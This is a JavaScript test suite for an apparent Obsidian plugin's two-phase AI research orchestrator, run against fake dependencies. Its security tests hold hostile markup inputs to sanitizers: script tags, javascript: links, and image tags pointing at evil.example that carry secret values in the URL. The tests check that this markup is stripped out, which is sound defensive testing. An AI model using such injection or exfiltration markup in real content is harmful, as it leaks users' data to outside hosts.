// Seamless research orchestrator (P3): phase order, stop before/after phase 1, late results, held-for-open-note, edits, failures and the coordinator limit.
// Everything runs against fake dependencies (no Obsidian, no provider, no network).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { load } = require('./support-replay.cjs');

const seamlessModule = load('experiences/visual-map/seamless-research.ts', {}, { URL });
const { SeamlessResearch, composePhase2Detail, renderImageBlock, problemMessageKey, problemActionKey } = seamlessModule;
const { ShallowExpansionCoordinator } = load('experiences/visual-map/expansion-batch.ts');
const { searchNotPerformedError } = load('ai/search-not-performed.ts');
const { DEFAULT_SETTINGS } = load('repository.ts', {
  obsidian: { App: class {}, TFile: class {}, TFolder: class {}, normalizePath: value => value, parseYaml: () => ({}), stringifyYaml: () => '' }
});

const plain = value => JSON.parse(JSON.stringify(value));
const tick = () => new Promise(resolve => setImmediate(resolve));
const settle = async () => {
  for (let i = 0; i < 8; i++) await tick();
};
function deferred() {
  let resolve, reject;
  const promise = new Promise((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

const PATH = 'Notes/Outfit.md';
const SKELETON_REPLY = { summary: '外套的搭配原則。', detail: '## 概念\n\n外套要和場合搭配。2024 年很流行。\n\n## 方法\n\n先決定主色再選配件。' };
const verifyResult = (overrides = {}) => ({
  detail: '## 概念\n\n外套要和場合搭配，材質影響保暖度[^1]。\n\n## 方法\n\n先決定主色再選配件。',
  footnotes: [{ id: '1', url: 'https://example.com/jacket', title: 'Jacket guide' }],
  verdicts: [],
  images: [],
  ...overrides
});
const IMAGE = (n = 1, overrides = {}) => ({
  imageUrl: `https://img.example.com/${n}.png`,
  sourceUrl: `https://example.com/page${n}`,
  title: `Look ${n}`,
  license: 'CC BY 4.0',
  ...overrides
});

/** Builds an orchestrator over an in-memory vault. `hooks` replace individual fakes. */
function harness(hooks = {}, initial = {}) {
  const notes = new Map();
  notes.set(PATH, { title: 'Outfit', summary: '', detail: '', model: 'claude:haiku', status: 'idea', ...initial });
  const timeline = [];
  const writes = [];
  const logs = [];
  const state = { shown: false, enabled: true, busy: new Set() };
  const calls = { ask: [], verify: [], images: [], save: [] };
  const deps = {
    enabled: () => state.enabled,
    repo: {
      readNote: async path => {
        const note = notes.get(path);
        if (!note) throw new Error('missing');
        return { ...note };
      },
      updateNote: async (path, patch) => {
        timeline.push(`write:${Object.keys(patch).join(',')}`);
        writes.push(plain(patch));
        const note = notes.get(path);
        for (const [key, value] of Object.entries(patch)) {
          if (key === 'researchWrittenHash' && !value) delete note.researchWrittenHash;
          else note[key] = value;
        }
      }
    },
    mutate: async work => work(),
    askModel: async input => {
      timeline.push('ask');
      calls.ask.push(input);
      return hooks.askModel ? hooks.askModel(input) : SKELETON_REPLY;
    },
    runVerify: async input => {
      timeline.push('verify');
      calls.verify.push({ ...input, detailAtCall: notes.get(PATH).detail });
      return hooks.runVerify ? hooks.runVerify(input) : verifyResult();
    },
    runImages: async input => {
      timeline.push('images');
      calls.images.push(input);
      return hooks.runImages ? hooks.runImages(input) : { images: [] };
    },
    saveImage: async (image, notePath, signal) => {
      calls.save.push(image.imageUrl);
      return hooks.saveImage ? hooks.saveImage(image, notePath, signal) : `Attachments/${image.imageUrl.split('/').pop()}`;
    },
    isShown: () => state.shown,
    capabilitiesFor: model => (hooks.capabilitiesFor ? hooks.capabilitiesFor(model) : { webSearch: true }),
    defaultModel: () => hooks.defaultModel ?? 'gpt-6-luna',
    running: new Set(),
    busyElsewhere: path => state.busy.has(path),
    skeletonInstruction: () => 'SKELETON TASK',
    log: message => logs.push(message),
    uuid: (() => {
      let n = 0;
      return () => `attempt-${++n}`;
    })()
  };
  const sr = new SeamlessResearch(deps);
  const request = (overrides = {}) => ({ path: PATH, title: 'Outfit', context: 'Parent: Style', language: 'zh-TW', ...overrides });
  return { sr, deps, notes, note: () => notes.get(PATH), timeline, writes, logs, state, calls, request };
}
const statusesWritten = h => h.writes.filter(w => w.status !== undefined).map(w => w.status);

// ---------- flag off ----------

test('flag off: every entry point refuses and no dependency is touched', async () => {
  const h = harness();
  h.state.enabled = false;
  await assert.rejects(() => h.sr.research(h.request()));
  await assert.rejects(() => h.sr.retry(PATH));
  await assert.rejects(() => h.sr.switchModelAndRetry(PATH));
  assert.deepEqual(h.timeline, []);
  assert.equal(h.sr.growingPaths().length, 0);
  assert.equal(h.deps.running.size, 0);
  assert.equal(h.deps.running.size, 0);
});

test('the setting defaults to off and the coordinator limit defaults to 3', () => {
  assert.equal(DEFAULT_SETTINGS.seamlessResearch, false);
});

// ---------- phase order ----------

test('phase 1 is written (filtered) before either phase-2 call starts', async () => {
  const h = harness();
  await h.sr.research(h.request());
  const ask = h.timeline.indexOf('ask');
  const firstWrite = h.timeline.findIndex(item => item.startsWith('write:') && item.includes('detail'));
  const verify = h.timeline.indexOf('verify');
  const images = h.timeline.indexOf('images');
  assert.ok(ask >= 0 && firstWrite > ask, 'phase-1 content is written after the phase-1 call');
  assert.ok(verify > firstWrite && images > firstWrite, 'both phase-2 calls start after the phase-1 write');
  const skeleton = h.calls.verify[0].detailAtCall;
  assert.match(skeleton, /外套要和場合搭配/);
  assert.doesNotMatch(skeleton, /2024/, 'the phase-1 text had its number sentence removed before it was written');
  assert.equal(h.calls.verify[0].skeleton, skeleton, 'phase 2 receives the filtered text');
  assert.equal(h.calls.ask[0].instruction, 'SKELETON TASK');
  assert.equal(h.note().summary, '外套的搭配原則。');
});

test('phase 2 replaces the AI-owned phase-1 text and ends completed, with the footnote definition and a stored hash', async () => {
  const h = harness();
  await h.sr.research(h.request());
  assert.match(h.note().detail, /材質影響保暖度\[\^1\]/);
  assert.match(h.note().detail, /\[\^1\]: \[Jacket guide\]\(https:\/\/example\.com\/jacket\)/);
  assert.equal(h.note().status, 'completed');
  assert.ok(h.note().researchWrittenHash);
  assert.equal(h.sr.problems().length, 0);
  assert.equal(h.sr.isGrowing(PATH), false);
  assert.equal(h.deps.running.size, 0);
  assert.equal(h.deps.running.size, 0);
});

test('phase 2 runs verify and images together, each as its own call', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  assert.equal(h.calls.verify.length, 1);
  assert.equal(h.calls.images.length, 1, 'the images call starts without waiting for verify');
  gate.resolve(verifyResult());
  await run;
});

test('a topic with existing user text skips phase 1 and receives the web text below it', async () => {
  const h = harness({}, { detail: '我自己寫的筆記。', status: 'completed' });
  await h.sr.research(h.request());
  assert.equal(h.calls.ask.length, 0);
  assert.ok(h.note().detail.startsWith('我自己寫的筆記。'));
  assert.match(h.note().detail, /### 網路補充/);
  assert.equal(h.note().researchWrittenHash, undefined);
});

// ---------- stop ----------

test('stop before phase 1 is written: nothing is written and the status is restored', async () => {
  const gate = deferred();
  const h = harness({ askModel: () => gate.promise }, { status: 'completed', detail: '' });
  const controller = new AbortController();
  const run = h.sr.research(h.request({ signal: controller.signal }));
  await settle();
  controller.abort();
  gate.resolve(SKELETON_REPLY);
  await run;
  assert.equal(h.note().detail, '');
  assert.equal(h.note().status, 'completed', 'status restored to what it was');
  assert.equal(h.calls.verify.length, 0);
  assert.ok(!h.writes.some(w => w.detail !== undefined));
  assert.equal(h.sr.isGrowing(PATH), false);
  assert.equal(h.deps.running.size, 0);
});

test('stop after phase 1: the phase-1 text stays, the status is idea, the late phase-2 result is not written', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const controller = new AbortController();
  const run = h.sr.research(h.request({ signal: controller.signal }));
  await settle();
  const phase1Text = h.note().detail;
  assert.ok(phase1Text.trim());
  controller.abort();
  gate.resolve(verifyResult());
  await run;
  assert.equal(h.note().detail, phase1Text);
  assert.equal(h.note().status, 'idea');
  assert.ok(!statusesWritten(h).includes('completed'));
  assert.ok(h.logs.some(line => line.includes('stale AI result was not written')), 'the dropped result is logged');
  assert.equal(h.sr.isGrowing(PATH), false);
});

test('stop while the result is held for an open note discards it and leaves the status idea', async () => {
  const h = harness();
  h.state.shown = true;
  await h.sr.research(h.request());
  assert.equal(h.sr.isHeld(PATH), true);
  const phase1Text = h.note().detail;
  h.sr.abort(PATH);
  await settle();
  assert.equal(h.sr.isHeld(PATH), false);
  assert.equal(h.sr.isGrowing(PATH), false);
  h.state.shown = false;
  await h.sr.flushHeld();
  assert.equal(h.note().detail, phase1Text, 'the discarded result is never applied');
  assert.equal(h.note().status, 'idea');
  assert.equal(h.deps.running.size, 0);
});

test('a batch stop signal reaches a held result as well', async () => {
  const h = harness();
  h.state.shown = true;
  const controller = new AbortController();
  await h.sr.research(h.request({ signal: controller.signal }));
  assert.equal(h.sr.isHeld(PATH), true);
  controller.abort();
  await settle();
  assert.equal(h.sr.isHeld(PATH), false);
  assert.equal(h.note().status, 'idea');
});

// ---------- late and stale ----------

test('a late attempt is dropped: the topic was renamed while phase 2 ran, so nothing is written', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  const phase1Text = h.note().detail;
  h.note().title = 'Renamed topic';
  gate.resolve(verifyResult());
  await run;
  assert.equal(h.note().detail, phase1Text);
  assert.notEqual(h.note().status, 'completed');
  assert.ok(h.logs.some(line => line.includes('stale AI result was not written')));
});

test('a phase-1 reply that arrives after the topic got text of its own is not written', async () => {
  const gate = deferred();
  const h = harness({ askModel: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  h.note().detail = '使用者先寫了。';
  gate.resolve(SKELETON_REPLY);
  await run;
  assert.equal(h.note().detail, '使用者先寫了。');
  assert.equal(h.calls.verify.length, 0);
  assert.notEqual(h.note().status, 'completed');
});

// ---------- held for an open note ----------

test('a note that is shown keeps its text; the result is applied after layout-change once it is closed', async () => {
  const h = harness();
  h.state.shown = true;
  await h.sr.research(h.request());
  const phase1Text = h.note().detail;
  assert.equal(h.sr.isHeld(PATH), true);
  assert.equal(h.sr.isGrowing(PATH), true, 'still breathing while held');
  assert.equal(h.note().status, 'running');
  assert.equal(h.note().detail, phase1Text, 'not rewritten in front of the user');
  await h.sr.flushHeld();
  assert.equal(h.note().detail, phase1Text, 'still shown: still held');
  h.state.shown = false;
  await h.sr.flushHeld();
  assert.match(h.note().detail, /材質影響保暖度/);
  assert.equal(h.note().status, 'completed');
  assert.equal(h.sr.isHeld(PATH), false);
  assert.equal(h.sr.isGrowing(PATH), false);
  assert.equal(h.deps.running.size, 0);
});

test('a user edit while the result is held turns the apply into an append and keeps the user text byte for byte', async () => {
  const h = harness();
  h.state.shown = true;
  await h.sr.research(h.request());
  const edited = `${h.note().detail}\n\n我加的一段。  \n\n  尾端空白保留。`;
  h.note().detail = edited;
  h.state.shown = false;
  await h.sr.flushHeld();
  assert.ok(h.note().detail.startsWith(edited), 'the edited text is an exact prefix');
  assert.match(h.note().detail, /### 網路補充/);
  assert.equal(h.note().researchWrittenHash, undefined, 'the detail now holds user text');
});

test('a user edit between the phases appends instead of replacing', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  const edited = `${h.note().detail}\n使用者補一句。`;
  h.note().detail = edited;
  gate.resolve(verifyResult());
  await run;
  assert.ok(h.note().detail.startsWith(edited));
  assert.match(h.note().detail, /### 網路補充/);
  assert.equal(h.note().status, 'completed');
});

test('the note opens while images download: the result is held again and the downloaded copies are not fetched twice', async () => {
  const h = harness({ runImages: () => ({ images: [IMAGE(1)] }) });
  h.deps.saveImage = async image => {
    h.calls.save.push(image.imageUrl);
    h.state.shown = true; // the user opens the note during the download
    return 'Attachments/1.png';
  };
  await h.sr.research(h.request());
  assert.equal(h.sr.isHeld(PATH), true);
  h.state.shown = false;
  await h.sr.flushHeld();
  assert.equal(h.calls.save.length, 1);
  assert.match(h.note().detail, /!\[\[Attachments\/1\.png\]\]/);
});

// ---------- failures ----------

test('network failure: reason network, retry button, status error, phase-1 text kept', async () => {
  let fail = true;
  const h = harness({
    runVerify: () => {
      if (fail) throw Object.assign(new Error('getaddrinfo ENOTFOUND api'), { code: 'ENOTFOUND' });
      return verifyResult();
    }
  });
  await h.sr.research(h.request());
  const problem = h.sr.problemFor(PATH);
  assert.deepEqual(plain(problem), { path: PATH, title: 'Outfit', reason: 'network', action: 'retry' });
  assert.equal(h.note().status, 'error');
  assert.ok(h.note().detail.trim(), 'the brief content stays');
  assert.ok(!statusesWritten(h).includes('completed'));
  assert.equal(h.sr.isGrowing(PATH), false);
  // retry: phase 2 only
  fail = false;
  await h.sr.retry(PATH);
  assert.equal(h.calls.ask.length, 1, 'phase 1 is not asked again');
  assert.equal(h.calls.verify.length, 2);
  assert.equal(h.calls.images.length, 2);
  assert.equal(h.sr.problemFor(PATH), undefined);
  assert.equal(h.note().status, 'completed');
  assert.match(h.note().detail, /材質影響保暖度/);
});

test('a research that finished without any web search counts as a network problem', async () => {
  const h = harness({
    runVerify: () => {
      throw searchNotPerformedError();
    }
  });
  await h.sr.research(h.request());
  assert.equal(h.sr.problemFor(PATH).reason, 'network');
  assert.equal(h.note().status, 'error');
});

test('an unknown phase-2 error is shown as a problem with retry and never as success', async () => {
  const h = harness({
    runVerify: () => {
      throw new Error('schema mismatch');
    }
  });
  await h.sr.research(h.request());
  assert.deepEqual(plain(h.sr.problemFor(PATH)), { path: PATH, title: 'Outfit', reason: 'other', action: 'retry' });
  assert.equal(h.note().status, 'error');
});

test('retry has nothing to do when there was no problem', async () => {
  const h = harness();
  await h.sr.research(h.request());
  await assert.rejects(() => h.sr.retry(PATH));
});

test('a model that cannot go online: no phase-2 call, the switch button, then the switch re-runs phase 2 on a capable model', async () => {
  const h = harness({ capabilitiesFor: model => ({ webSearch: model !== 'claude:haiku' }) });
  await h.sr.research(h.request());
  assert.equal(h.calls.verify.length, 0);
  assert.equal(h.calls.images.length, 0);
  assert.deepEqual(plain(h.sr.problemFor(PATH)), { path: PATH, title: 'Outfit', reason: 'no-web-model', action: 'switch-model' });
  assert.equal(h.note().status, 'error');
  assert.ok(h.note().detail.trim());
  await h.sr.switchModelAndRetry(PATH);
  assert.equal(h.note().model, 'gpt-6-luna', 'the default model when it can go online');
  assert.equal(h.note().modelSource, 'manual');
  assert.equal(h.calls.verify.length, 1);
  assert.equal(h.calls.verify[0].model, 'gpt-6-luna');
  assert.equal(h.calls.ask.length, 1);
  assert.equal(h.note().status, 'completed');
  assert.equal(h.sr.problemFor(PATH), undefined);
});

test('the switch falls back to claude:sonnet when the default model cannot go online either', async () => {
  const h = harness({ capabilitiesFor: model => ({ webSearch: model === 'claude:sonnet' }), defaultModel: 'local-only' });
  await h.sr.research(h.request());
  await h.sr.switchModelAndRetry(PATH);
  assert.equal(h.note().model, 'claude:sonnet');
});

test('phase-1 failure throws for the batch, marks the topic error and writes no content', async () => {
  const h = harness({
    askModel: () => {
      throw new Error('provider down');
    }
  });
  await assert.rejects(() => h.sr.research(h.request()), /provider down/);
  assert.equal(h.note().detail, '');
  assert.equal(h.note().status, 'error');
  assert.equal(h.calls.verify.length, 0);
  assert.equal(h.deps.running.size, 0);
});

test('a phase-1 draft that is empty after the check is a phase-1 failure', async () => {
  const h = harness({ askModel: () => ({ summary: '', detail: '價格是 3000 元。' }) });
  await assert.rejects(() => h.sr.research(h.request()));
  assert.equal(h.note().detail, '');
  assert.equal(h.note().status, 'error');
});

test('a phase-2 text that is empty after cleaning is a problem, not a success', async () => {
  const h = harness({ runVerify: () => verifyResult({ detail: '<script>alert(1)</script>' }) });
  await h.sr.research(h.request());
  assert.equal(h.sr.problemFor(PATH).reason, 'other');
  assert.equal(h.note().status, 'error');
});

test('no failure path ever writes the completed status', async () => {
  const cases = [
    { askModel: () => { throw new Error('x'); } },
    { runVerify: () => { throw new Error('x'); } },
    { runVerify: () => { throw Object.assign(new Error('ECONNRESET'), { code: 'ECONNRESET' }); } },
    { capabilitiesFor: () => ({ webSearch: false }) },
    { runVerify: () => verifyResult({ detail: '' }) }
  ];
  for (const hooks of cases) {
    const h = harness(hooks);
    await h.sr.research(h.request()).catch(() => {});
    assert.ok(!statusesWritten(h).includes('completed'), JSON.stringify(Object.keys(hooks)));
    assert.notEqual(h.note().status, 'completed');
  }
});

// ---------- images ----------

test('images are not required: none found and not requested is silent success', async () => {
  const h = harness({ runImages: () => ({ images: [] }) });
  await h.sr.research(h.request({ imagesRequested: false }));
  assert.equal(h.sr.problems().length, 0);
  assert.equal(h.note().status, 'completed');
});

test('images requested and none found: the problem names the topic, offers dismiss only, and the status is not success', async () => {
  const h = harness({ runImages: () => ({ images: [] }) });
  await h.sr.research(h.request({ imagesRequested: true }));
  assert.deepEqual(plain(h.sr.problemFor(PATH)), { path: PATH, title: 'Outfit', reason: 'no-images', action: 'dismiss' });
  assert.equal(h.note().status, 'error');
  assert.match(h.note().detail, /材質影響保暖度/, 'the verified text is still written');
  h.sr.dismiss(PATH);
  assert.equal(h.sr.problemFor(PATH), undefined);
});

test('a failing images call does not fail verify: silent when images were not requested', async () => {
  const h = harness({
    runImages: () => {
      throw new Error('images provider error');
    }
  });
  await h.sr.research(h.request({ imagesRequested: false }));
  assert.match(h.note().detail, /材質影響保暖度/);
  assert.equal(h.note().status, 'completed');
  assert.equal(h.sr.problems().length, 0);
  assert.equal(h.calls.images.length, 1, 'the images call is not retried');
});

test('a failing images call with images requested is the no-images problem, not a network problem', async () => {
  const h = harness({
    runImages: () => {
      throw Object.assign(new Error('ENOTFOUND'), { code: 'ENOTFOUND' });
    }
  });
  await h.sr.research(h.request({ imagesRequested: true }));
  assert.equal(h.sr.problemFor(PATH).reason, 'no-images');
  assert.equal(h.sr.problemFor(PATH).action, 'dismiss');
  assert.match(h.note().detail, /材質影響保暖度/);
  assert.equal(h.calls.verify.length, 1);
});

test('images that pass the check are saved locally and embedded with a source line; ineligible ones are never downloaded', async () => {
  const h = harness({
    runImages: () => ({
      images: [
        IMAGE(1),
        IMAGE(2, { imageUrl: 'http://img.example.com/2.png' }),
        IMAGE(3, { license: 'unknown' }),
        IMAGE(4, { imageUrl: 'https://localhost/4.png' }),
        IMAGE(5, { title: 'Tricky [x](javascript:alert(1)) title' })
      ]
    })
  });
  await h.sr.research(h.request({ imagesRequested: true }));
  assert.deepEqual(h.calls.save, ['https://img.example.com/1.png', 'https://img.example.com/5.png']);
  const detail = h.note().detail;
  assert.match(detail, /!\[\[Attachments\/1\.png\]\]\n.*\[Look 1\]\(https:\/\/example\.com\/page1\).*CC BY 4\.0/);
  assert.doesNotMatch(detail, /javascript:/);
  assert.doesNotMatch(detail, /https:\/\/img\.example\.com/, 'remote image addresses never reach the note');
  assert.equal(h.note().status, 'completed');
  assert.equal(h.sr.problems().length, 0);
});

test('an image that fails to download is dropped silently; when none are saved and images were requested it is the no-images problem', async () => {
  const h = harness({
    runImages: () => ({ images: [IMAGE(1), IMAGE(2)] }),
    saveImage: () => {
      throw new Error('not an image');
    }
  });
  await h.sr.research(h.request({ imagesRequested: false }));
  assert.equal(h.sr.problems().length, 0);
  assert.equal(h.note().status, 'completed');
  const h2 = harness({
    runImages: () => ({ images: [IMAGE(1)] }),
    saveImage: () => {
      throw new Error('not an image');
    }
  });
  await h2.sr.research(h2.request({ imagesRequested: true }));
  assert.equal(h2.sr.problemFor(PATH).reason, 'no-images');
  assert.equal(h2.note().status, 'error');
});

test('one saved image out of several is enough when images were requested', async () => {
  let calls = 0;
  const h = harness({
    runImages: () => ({ images: [IMAGE(1), IMAGE(2)] }),
    saveImage: image => {
      if (++calls === 1) throw new Error('rejected');
      return `Attachments/${image.imageUrl.split('/').pop()}`;
    }
  });
  await h.sr.research(h.request({ imagesRequested: true }));
  assert.equal(h.sr.problems().length, 0);
  assert.equal(h.note().status, 'completed');
  assert.match(h.note().detail, /!\[\[Attachments\/2\.png\]\]/);
});

// ---------- composition, security ----------

test('composePhase2Detail removes script tags, javascript links, data images and remote img tags, then adds footnotes and local images', () => {
  const hostile = verifyResult({
    detail:
      '## 概念\n\n安全句子[^1]。<script>alert(1)</script>\n\n[點我](javascript:alert(1)) ![x](https://evil.example/leak?q=secret)\n\n<img src="https://evil.example/?note=SECRET">\n\n![d](data:image/png;base64,AAAA)'
  });
  const out = composePhase2Detail(hostile, [{ path: 'Att/a.png', image: IMAGE(1) }]).detail;
  assert.doesNotMatch(out, /script|javascript:|evil\.example|data:image|<img/i);
  assert.match(out, /安全句子\[\^1\]/);
  assert.match(out, /\[\^1\]: \[Jacket guide\]/);
  assert.match(out, /!\[\[Att\/a\.png\]\]/);
});

test('corrections keep the 原本寫 footnote when the web text corrects a phase-1 sentence', () => {
  const out = composePhase2Detail(
    verifyResult({
      detail: '## 概念\n\n外套要和場合搭配。\n\n黑色一定顯瘦。',
      footnotes: [],
      verdicts: [{ sentence: '黑色一定顯瘦。', verdict: 'unsupported', correction: '黑色通常有收斂視覺的效果。', sourceUrl: 'https://example.com/black' }]
    }),
    []
  ).detail;
  assert.match(out, /黑色通常有收斂視覺的效果。\[\^\d+\]/);
  assert.match(out, /原本寫：黑色一定顯瘦。/);
});

test('image block labels cannot break the link or add markup', () => {
  const block = renderImageBlock([{ path: 'a.png', image: IMAGE(1, { title: 'A](https://x) <b>', license: 'CC [BY]\n4' }) }]);
  assert.doesNotMatch(block, /<b>/);
  assert.equal((block.match(/\]\(/g) || []).length, 1, 'only the one source link');
});

test('problem sentences and buttons map to the agreed i18n keys', () => {
  assert.equal(problemMessageKey('no-images'), 'ui.seamless_problem_no_images_0');
  assert.equal(problemMessageKey('network'), 'ui.seamless_problem_network');
  assert.equal(problemMessageKey('no-web-model'), 'ui.seamless_problem_no_web_model');
  assert.equal(problemActionKey('retry'), 'ui.seamless_action_retry');
  assert.equal(problemActionKey('switch-model'), 'ui.seamless_action_switch_model');
  assert.equal(problemActionKey('dismiss'), 'ui.seamless_action_dismiss');
});

test('the zh-TW problem sentences are the agreed wording', () => {
  const { zhTW } = load('i18n/zh-TW.ts');
  assert.equal(zhTW['ui.seamless_problem_no_images_0'].replace('{0}', '穿搭'), '穿搭沒找到合適的圖');
  assert.equal(zhTW['ui.seamless_problem_network'], '這次沒能上網，內容比較簡略');
  assert.equal(zhTW['ui.seamless_action_retry'], '再試一次');
  assert.equal(zhTW['ui.seamless_problem_no_web_model'], '這個模型不能上網，內容比較簡略');
  assert.equal(zhTW['ui.seamless_action_switch_model'], '換成能上網的模型');
});

// ---------- lifecycle ----------

test('a second research on a busy topic is refused', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const first = h.sr.research(h.request());
  await settle();
  await assert.rejects(() => h.sr.research(h.request()));
  gate.resolve(verifyResult());
  await first;
});

test('a topic another flow is working on is busy', async () => {
  const h = harness();
  h.deps.running.add(PATH);
  await assert.rejects(() => h.sr.research(h.request()));
  h.deps.running.delete(PATH);
  h.state.busy.add(PATH);
  await assert.rejects(() => h.sr.research(h.request()));
  assert.deepEqual(h.timeline, []);
});

test('dispose aborts what runs, drops held results and writes nothing afterwards', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  const before = h.writes.length;
  h.sr.dispose();
  gate.resolve(verifyResult());
  await run;
  assert.equal(h.writes.length, before);
  assert.equal(h.sr.growingPaths().length, 0);
  const held = harness();
  held.state.shown = true;
  await held.sr.research(held.request());
  held.sr.dispose();
  held.state.shown = false;
  const writes = held.writes.length;
  await held.sr.flushHeld();
  assert.equal(held.writes.length, writes);
});

test('phase 2 waits for a free slot: at most the configured number of topics are in phase 2 together', async () => {
  const gates = [];
  let live = 0;
  let peak = 0;
  const notes = ['A', 'B', 'C', 'D'];
  const h = harness({
    runVerify: input => {
      live++;
      peak = Math.max(peak, live);
      const gate = deferred();
      gates.push(gate);
      return gate.promise.finally(() => live--);
    }
  });
  h.deps.phase2Concurrency = 2;
  const sr = new SeamlessResearch({ ...h.deps, phase2Concurrency: 2 });
  // Four more topics next to PATH.
  for (const name of notes) h.notes.set(`Notes/${name}.md`, { title: name, summary: '', detail: '', model: 'claude:haiku', status: 'idea' });
  const runs = notes.map(name => sr.research({ path: `Notes/${name}.md`, title: name, context: '', language: 'zh-TW' }));
  await settle();
  // The fake verify records detail of PATH only; the peak is what matters here.
  assert.equal(peak, 2);
  while (gates.length < 4 || gates.some(g => !g.done)) {
    const open = gates.filter(g => !g.done);
    if (!open.length) break;
    open[0].done = true;
    open[0].resolve(verifyResult());
    await settle();
  }
  await Promise.all(runs);
  assert.equal(peak, 2);
});

test('events: written carries the note before and after, change fires as the topic grows and settles', async () => {
  const h = harness();
  const seen = [];
  h.sr.subscribe(event => seen.push(event.type));
  await h.sr.research(h.request());
  assert.ok(seen.includes('change'));
  assert.ok(seen.includes('written'));
});

// ---------- coordinator limit ----------

async function peakConcurrency(startArgs) {
  const coordinator = new ShallowExpansionCoordinator(new Map(), new Map());
  let live = 0;
  let peak = 0;
  const children = Array.from({ length: 10 }, (_, i) => ({ path: `n${i}.md` }));
  const gates = [];
  const accepted = coordinator.start(
    'batch',
    children,
    async (_child, _signal, ok) => {
      ok();
      live++;
      peak = Math.max(peak, live);
      const gate = deferred();
      gates.push(gate);
      await gate.promise;
      live--;
    },
    () => {},
    ...startArgs
  );
  await accepted;
  for (let i = 0; i < 40; i++) {
    await settle();
    gates.splice(0).forEach(gate => gate.resolve());
  }
  return peak;
}

test('coordinator start: the default limit stays 3, an explicit limit is honoured', async () => {
  assert.equal(await peakConcurrency([]), 3);
  assert.equal(await peakConcurrency([undefined]), 3);
  assert.equal(await peakConcurrency([undefined, 8]), 8);
  assert.equal(await peakConcurrency([undefined, 0]), 3, 'a nonsense limit falls back to the default');
});

test('abortAll (the plugin-wide stop) stops a running topic and a held one', async () => {
  const gate = deferred();
  const h = harness({ runVerify: () => gate.promise });
  const run = h.sr.research(h.request());
  await settle();
  h.sr.abortAll();
  gate.resolve(verifyResult());
  await run;
  assert.equal(h.note().status, 'idea');
  assert.equal(h.sr.growingPaths().length, 0);
  const held = harness();
  held.state.shown = true;
  await held.sr.research(held.request());
  held.sr.abortAll();
  await settle();
  assert.equal(held.sr.isHeld(PATH), false);
  assert.equal(held.note().status, 'idea');
});
